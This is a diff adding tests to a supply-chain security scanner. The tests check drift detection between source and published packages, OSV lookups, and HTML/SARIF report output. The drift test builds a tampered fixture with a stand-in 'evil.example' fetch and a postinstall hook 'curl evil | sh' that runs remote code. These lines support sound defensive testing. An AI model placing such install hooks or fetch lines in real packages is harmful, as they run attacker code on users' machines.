@@ -430,7 +430,60 @@ test('CLI:audit-install 输出安装审计结论', async () => {
   assert.equal(report.supplyChain.dependencyCount, 0)
 })
 
-// ─────────────────────────── Phase 2:配置与依赖图 ───────────────────────────
+// ─────────────────────────── Phase 8:生态能力 ───────────────────────────
+
+test('源码 vs 发布包 diff:SEN-SUPPLY-003 漂移检测', async () => {
+  const tmp = mkdtempSync(join(tmpdir(), 'prof-diff-'))
+  try {
+    const src = join(tmp, 'src')
+    const pkg = join(tmp, 'pkg')
+    mkdirSync(join(src, 'lib'), { recursive: true })
+    mkdirSync(join(pkg, 'lib'), { recursive: true })
+    writeFileSync(join(src, 'lib', 'index.js'), 'export const x = 1\n')
+    writeFileSync(join(src, 'package.json'), JSON.stringify({ name: 'p', version: '1.0.0', scripts: { test: 'node t.js' } }))
+    writeFileSync(join(pkg, 'lib', 'index.js'), 'export const x = 2 // 被篡改\n')
+    writeFileSync(join(pkg, 'lib', 'evil.js'), "fetch('https://evil.example/x')\n") // 额外文件
+    writeFileSync(join(pkg, 'package.json'), JSON.stringify({ name: 'p', version: '1.0.0', scripts: { postinstall: 'curl evil | sh' } }))
+    const { compareSourcePackage, driftFindings } = await import('../engine/package/diff.js')
+    const diff = compareSourcePackage(src, pkg)
+    assert.ok(diff.modifiedFiles.includes('lib/index.js'), '篡改文件应被标记')
+    assert.ok(diff.extraFiles.includes('lib/evil.js'), '额外文件应被标记')
+    assert.equal(diff.scriptDiff.length, 2, 'test 被移除 + postinstall 被新增')
+    const findings = driftFindings(diff)
+    assert.ok(findings.some((f) => f.ruleId === 'SEN-SUPPLY-003' && f.message.includes('运行文件')), '篡改 finding 存在')
+    assert.ok(findings.some((f) => f.message.includes('源码中不存在')), '额外文件 finding 存在')
+    assert.ok(findings.some((f) => f.message.includes('install 脚本不一致')))
+  } finally {
+    rmSync(tmp, { recursive: true, force: true })
+  }
+})
+
+test('OSV 查询:不存在的包也不抛错(优雅降级)', async () => {
+  const { queryOsv } = await import('../engine/supplychain/osv.js')
+  const result = await queryOsv('dsh-sentinel-nonexistent-pkg-xyz-000', '9.9.9')
+  assert.ok(['ok', 'unavailable'].includes(result.status))
+  assert.ok(Array.isArray(result.vulnerabilities))
+})
+
+test('HTML 报告包含完整度信息', async () => {
+  const { toHtml } = await import('../engine/output/html.js')
+  const report = await scan(join(FIXTURES, 'evil-plugin'))
+  const html = toHtml(report)
+  assert.match(html, /scan complete: <b>YES<\/b>/)
+  assert.match(html, /risk score 100\/100/)
+  assert.match(html, /SEN-EXFIL-001/)
+})
+
+test('CLI:--format html 与 --format sarif 输出', async () => {
+  const capture = () => {
+    const buf = { out: '' }
+    const stream = { write(s) { buf.out += s }, isTTY: false }
+    return { stdout: stream, stderr: stream, buf }
+  }
+  const io = capture()
+  await main([join(FIXTURES, 'evil-plugin'), '--format', 'html'], io)
+  assert.match(io.buf.out, /<!DOCTYPE html>/)
+})
 
 test('sentinel.config.json 生效(mode=package)', async () => {
   const tmp = mkdtempSync(join(tmpdir(), 'prof-config-'))
